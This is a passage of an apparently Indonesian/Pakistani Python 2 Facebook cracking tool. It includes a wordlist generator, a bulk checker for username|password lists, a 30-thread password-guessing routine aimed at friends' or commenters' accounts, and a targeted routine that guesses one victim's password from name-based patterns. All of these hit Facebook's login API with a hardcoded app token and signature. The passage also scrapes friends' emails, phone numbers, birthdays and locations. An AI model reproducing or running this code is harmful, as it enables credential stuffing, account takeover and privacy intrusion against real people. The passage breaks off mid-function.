            file.write('%s%s\n%s%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s%s\n%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s' % (a, c, a, b, b, a, b, c, c, a, c, b, a, a, b, b, c, c, a, d, b, d, c, d, d, d, d, a, d, b, d, c, a, e, a, f, a, g, a, h, b, e, b, f, b, g, b, h, c, e, c, f, c, g, c, h, d, e, d, f, d, g, d, h, e, a, f, a, g, a, h, a, e, b, f, b, g, b, h, b, e, c, f, c, g, c, h, c, e, d, f, d, g, d, h, d, d, d, a, f, g, a, g, h, f, g, f, h, f, f, g, f, g, h, g, g, h, f, h, g, h, h, h, g, f, a, g, h, b, f, g, b, g, h, c, f, g, c, g, h, d, f, g, d, g, h, a, i, a, j, a, k, i, e, i, j, i, k, b, i, b, j, b, k, c, i, c, j, c, k, e, k, j, a, j, b, j, c, j, d, j, j, k, a, k, b, k, c, k, d, k, k, i, l, i, m, i, n, j, l, j, m, j, n, j, k))
            wg = 0
            while wg < 100:
                wg = wg + 1
                file.write(a + str(wg) + '\n')

            en = 0
            while en < 100:
                en = en + 1
                file.write(i + str(en) + '\n')

            word = 0
            while word < 100:
                word = word + 1
                file.write(d + str(word) + '\n')

            gen = 0
            while gen < 100:
                gen = gen + 1
                file.write(j + str(gen) + '\n')

            file.close()
            time.sleep(1.5)
            print '\n\x1b[1;91m[+] \x1b[1;97mSaved \x1b[1;91m: \x1b[1;97m %s.txt' % a
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            lain()
        except IOError as e:
            print '\x1b[1;91m[!] Make file failed'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            lain()


def check_akun():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        print logo
        print "\033[1;97m «--------------------------------------------»"
        print '\x1b[1;91m[?] \x1b[1;92mIsi File\x1b[1;91m : \x1b[1;97musername|password'
        print "\033[1;97m «--------------------------------------------»"
        live = []
        cek = []
        die = []
        try:
            file = raw_input('\x1b[1;91m[+] \x1b[1;92mFile \x1b[1;91m:\x1b[1;97m ')
            list = open(file, 'r').readlines()
        except IOError:
            print '\x1b[1;91m[!] File not found'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            lain()

    pemisah = raw_input('\x1b[1;91m[+] \x1b[1;92mSeparator \x1b[1;91m:\x1b[1;97m ')
    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
    print "\033[1;97m «--------------------------------------------»"
    for meki in list:
        username, password = meki.strip().split(str(pemisah))
        url = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + username + '&locale=en_US&password=' + password + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
        data = requests.get(url)
        mpsh = json.loads(data.text)
        if 'access_token' in mpsh:
            live.append(password)
            print '\x1b[1;97m[\x1b[1;92mLive\x1b[1;97m]  \x1b[1;97m' + username + ' | ' + password
        elif 'www.facebook.com' in mpsh['error_msg']:
            cek.append(password)
            print '\x1b[1;97m[\x1b[1;93mCheck\x1b[1;97m] \x1b[1;97m' + username + ' | ' + password
        else:
            die.append(password)
            print '\x1b[1;97m[\x1b[1;91mDie\x1b[1;97m]  \x1b[1;97m' + username + ' | ' + password

    print '\n\x1b[1;91m[+] \x1b[1;97mTotal\x1b[1;91m : \x1b[1;97mLive=\x1b[1;92m' + str(len(live)) + ' \x1b[1;97mCheck=\x1b[1;93m' + str(len(cek)) + ' \x1b[1;97mDie=\x1b[1;91m' + str(len(die))
    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
    lain()


def grupsaya():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        print logo
        print "\033[1;97m «--------------------------------------------»"
        jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
        print "\033[1;97m «--------------------------------------------»"
        try:
            uh = requests.get('https://graph.facebook.com/me/groups?access_token=' + toket)
            gud = json.loads(uh.text)
            for p in gud['data']:
                nama = p['name']
                id = p['id']
                f = open('grupid.txt', 'w')
                listgrup.append(id)
                f.write(id + '\n')
                print "\033[1;97m «--------------------------------------------»"
                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName  \x1b[1;91m:\x1b[1;97m ' + str(nama)
                print '\x1b[1;91m[+] \x1b[1;92mID    \x1b[1;91m:\x1b[1;97m ' + str(id)
                print "\033[1;97m «--------------------------------------------»"

            print '\n\r\x1b[1;91m[+] \x1b[1;97mTotal Group \x1b[1;96m%s' % len(listgrup)
            print '\x1b[1;91m[+] \x1b[1;97mSaved \x1b[1;91m: \x1b[1;97mgrupid.txt'
            f.close()
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            lain()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Stopped'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            lain()
        except KeyError:
            os.remove('grupid.txt')
            print '\x1b[1;91m[!] Group not found'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            lain()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[\xe2\x9c\x96] No connection'
            keluar()
        except IOError:
            print '\x1b[1;91m[!] Error when creating file'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            lain()


def guard():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print "\033[1;97m «--------------------------------------------»"
    print '║-> \x1b[1;37;40m1. Enable'
    print '║-> \x1b[1;37;40m2. Disable'
    print '║-> \x1b[1;31;40m0. Back'
    print "\033[1;97m «--------------------------------------------»"
    g = raw_input('╚═\x1b[1;91m▶\x1b[1;97m ')
    if g == '1':
        aktif = 'true'
        gaz(toket, aktif)
    else:
        if g == '2':
            non = 'false'
            gaz(toket, non)
        else:
            if g == '0':
                lain()
            else:
                if g == '':
                    keluar()
                else:
                    keluar()
                   
def userinfox():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print "\033[1;97m «--------------------------------------------»"
    id = raw_input('\x1b[1;91m[+] \x1b[1;92mInput ID\x1b[1;97m/\x1b[1;92mName\x1b[1;91m : \x1b[1;97m')
    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait\x1b[1;97m...')
    r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
    cok = json.loads(r.text)
    for p in cok['data']:
        if id in p['name'] or id in p['id']:
            r = requests.get('https://graph.facebook.com/' + p['id'] + '?access_token=' + toket)
            z = json.loads(r.text)
            print "\033[1;97m «--------------------------------------------»"
            try:
                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mName\x1b[1;97m          : ' + z['name']
            except KeyError:
                print '\x1b[1;91m[?] \x1b[1;92mName\x1b[1;97m          : \x1b[1;91mNot found'
            else:
                try:
                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mID\x1b[1;97m            : ' + z['id']
                except KeyError:
                    print '\x1b[1;91m[?] \x1b[1;92mID\x1b[1;97m            : \x1b[1;91mNot found'
                else:
                    try:
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mEmail\x1b[1;97m         : ' + z['email']
                    except KeyError:
                        print '\x1b[1;91m[?] \x1b[1;92mEmail\x1b[1;97m         : \x1b[1;91mNot found'
                    else:
                        try:
                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPhone Number\x1b[1;97m  : ' + z['mobile_phone']
                        except KeyError:
                            print '\x1b[1;91m[?] \x1b[1;92mPhone Number\x1b[1;97m  : \x1b[1;91mNot found'

                        try:
                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mLocation\x1b[1;97m      : ' + z['location']['name']
                        except KeyError:
                            print '\x1b[1;91m[?] \x1b[1;92mLocation\x1b[1;97m      : \x1b[1;91mNot found'

                    try:
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mBirthday\x1b[1;97m      : ' + z['birthday']
                    except KeyError:
                        print '\x1b[1;91m[?] \x1b[1;92mBirthday\x1b[1;97m      : \x1b[1;91mNot found'

                try:
                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mSchool\x1b[1;97m        : '
                    for q in z['education']:
                        try:
                            print '\x1b[1;91m                   ~ \x1b[1;97m' + q['school']['name']
                        except KeyError:
                            print '\x1b[1;91m                   ~ \x1b[1;91mNot found'

                except KeyError:
                    pass

            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            menu()
    else:
        print '\x1b[1;91m[\xe2\x9c\x96] User not found'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
        menu()
	
def fbpostsx():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
        print "\033[1;97m «--------------------------------------------»"
	print( "\x1b[1;32;92m[1] \033[1;33;93m>> Crack From Friendlist \033[1;97m(\033[1;91mTech Abm\033[1;97m)") 
	time.sleep(0.05)
	print( "\x1b[1;32;92m[2] \033[1;33;98m>> Crack From Fb Posts \033[1;97m(\033[1;91mTech Abm\033[1;97m)") 
	time.sleep(0.05)
	print( "\x1b[1;32;36m[0] \033[1;33;96m>> Back") 
	print "\033[1;97m «--------------------------------------------»"
	pilih_fbpostsx()

def pilih_fbpostsx():
	peak = raw_input("\n\033[1;31;40m>>> \033[1;97m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_fbpostsx()
        elif peak =="1":
		os.system('clear')
		print logo
		print "\033[1;97m «--------------------------------------------»"
		jalan('\033[1;96m[⊱⋕⊰] \033[1;92mGetting ID \033[1;97m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print logo
		print "\033[1;97m «--------------------------------------------»"
		idt = raw_input("\033[1;96m[⊱⋕⊰]\033[1;93m Enter Posts \033[1;91m : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;31;37m[⊱⋕⊰] Name : "+op["name"]
		except KeyError:
			print"\x1b[1;37m[⊱⋕⊰] ID Not Found!"
			raw_input("\n\033[1;96m[\033[1;94mBack\033[1;96m]")
			super()
		print"\033[1;35;37m[⊱⋕⊰] Getting ID  "
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih_super()

	print "\033[1;36;96m[⊱⋕⊰] Total IDs : \033[1;92m"+str(len(id))
	jalan('\033[1;34;96m[⊱⋕⊰] Please Wait ')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;93mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;97m  «-----\x1b[1;91m【To Stop Process Press CTRL+Z】\033[1;97m----»"
	print "\033[1;97m «--------------------------------------------»"
	jalan('   \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
        jalan(' \033[1;91m            Create By : Tech-Abm')
	print "\033[1;97m «--------------------------------------------»"

	def main(arg):
		global oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass #Dev:Tech-abm
		try:													
			k = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			y = json.loads(k.text)
			pass1 = ('786786')
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			s = json.load(data)
			if 'access_token' in s:
				print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass1
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in s["error_msg"]:
					print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass1
					cek = open("out/checkpoint.txt", "k")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = ('Pakistan123') 
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					s = json.load(data)
					if 'access_token' in s:
						print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass2
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in s["error_msg"]:
							print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass2
							cek = open("out/checkpoint.txt", "k")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = y['first_name'] + '123'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							s = json.load(data)
							if 'access_token' in s:
								print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass3
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in s["error_msg"]:
									print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass3
									cek = open("out/checkpoint.txt", "k")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = y['first_name'] + '12345'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									s = json.load(data)
									if 'access_token' in s:
										print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass4
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in s["error_msg"]:
											print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass4
											cek = open("out/checkpoint.txt", "k")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = y['first_name'] + '786'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											s = json.load(data)
											if 'access_token' in s:
												print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass5
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in s["error_msg"]:
													print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass5
													cek = open("out/checkpoint.txt", "k")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = y['last_name'] + '123'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													s = json.load(data)
													if 'access_token' in s:
														print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\x1b[1;97m' + pass6
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in s["error_msg"]:
															print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass6
															cek = open("out/checkpoint.txt", "k")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															pass7 = y['last_name'] + '786'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															s = json.load(data)
															if 'access_token' in s:
																print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass7
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in s["error_msg"]:
																	print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass7
																	cek = open("out/checkpoint.txt", "k")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
																												   	
											                               
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;97m «--------------------------------------------»"
	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mProcess Has Been Completed \033[1;97m....'
	print"\033[1;96m[+] \033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print("\033[1;96m[+] \033[1;92mCP File Has Been Saved \033[1;91m: \033[1;97mout/checkpoint.txt")
	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
	login()
	
def minihackx():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        print logo
        print "\033[1;97m «--------------------------------------------»"
        print '\x1b[1;91m[ INFO ] Target must be your friend !'
        print "\033[1;97m «--------------------------------------------»"
        try:
            id = raw_input('\x1b[1;91m[+] \x1b[1;92mID Target \x1b[1;91m:\x1b[1;97m ')
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
            r = requests.get('https://graph.facebook.com/' + id + '?access_token=' + toket)
            a = json.loads(r.text)
            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mName\x1b[1;97m : ' + a['name']
            jalan('\x1b[1;91m[+] \x1b[1;92mChecking \x1b[1;97m...')
            time.sleep(2)
            jalan('\x1b[1;91m[+] \x1b[1;92mOpen security \x1b[1;97m...')
            time.sleep(2)
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
            print "\033[1;97m «--------------------------------------------»"
            pz1 = a['first_name'] + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            y = json.load(data)
            if 'access_token' in y:
                print '\x1b[1;91m[+] \x1b[1;92mFounded.'
                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz1
                raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                menu_hack()
            else:
                if 'www.facebook.com' in y['error_msg']:
                    print '\x1b[1;91m[+] \x1b[1;92mFounded.'
                    print '\x1b[1;91m[!] \x1b[1;93mAccount Maybe Checkpoint'
                    print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz1
                    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                    menu_hack()
                else:
                    pz2 = a['first_name'] + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    y = json.load(data)
                    if 'access_token' in y:
                        print '\x1b[1;91m[+] \x1b[1;92mFounded.'
                        print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz2
                        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                        menu_hack()
                    else:
                        if 'www.facebook.com' in y['error_msg']:
                            print '\x1b[1;91m[+] \x1b[1;92mFounded.'
                            print '\x1b[1;91m[!] \x1b[1;93mAccount Maybe Checkpoint'
                            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz2
                            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                            menu_hack()
                        else:
                            pz3 = a['last_name'] + '123'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            y = json.load(data)
                            if 'access_token' in y:
                                print '\x1b[1;91m[+] \x1b[1;92mFounded.'
                                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
                                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz3
                                raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                                menu_hack()
                            else:
                                if 'www.facebook.com' in y['error_msg']:
                                    print '\x1b[1;91m[+] \x1b[1;92mFounded.'
                                    print '\x1b[1;91m[!] \x1b[1;93mAccount Maybe Checkpoint'
                                    print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
                                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz3
                                    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                                    menu_hack()
                                else:
                                    lahir = a['first_name'] + '786'
                                    pz4 = lahir.replace('/', '')
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    y = json.load(data)
                                    if 'access_token' in y:
                                        print '\x1b[1;91m[+] \x1b[1;92mFounded.'
                                        print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
                                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz4
                                        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                                        menu_hack()
                                    else:
                                        if 'www.facebook.com' in y['error_msg']:
                                            print '\x1b[1;91m[+] \x1b[1;92mFounded.'
                                            print '\x1b[1;91m[!] \x1b[1;93mAccount Maybe Checkpoint'
                                            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
                                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz4
                                            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                                            menu_hack()
                                        else:
                                            print '\x1b[1;91m[!] Sorry, opening password target failed :('
                                            print '\x1b[1;91m[!] Try other method.'
                                            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                                            menu_hack()
        except KeyError:
            print '\x1b[1;91m[!] Terget not found'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            menu_hack()
           
def yahoochkx():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print "\033[1;97m «--------------------------------------------»"
    print '║-> \x1b[1;37;40m1. From Friends'
    print '║-> \x1b[1;37;40m2. From File'
    print '║-> \x1b[1;31;40m0. Back'
    print "\033[1;97m «--------------------------------------------»"
    yahoochkx_pilih()


def yahoochkx_pilih():
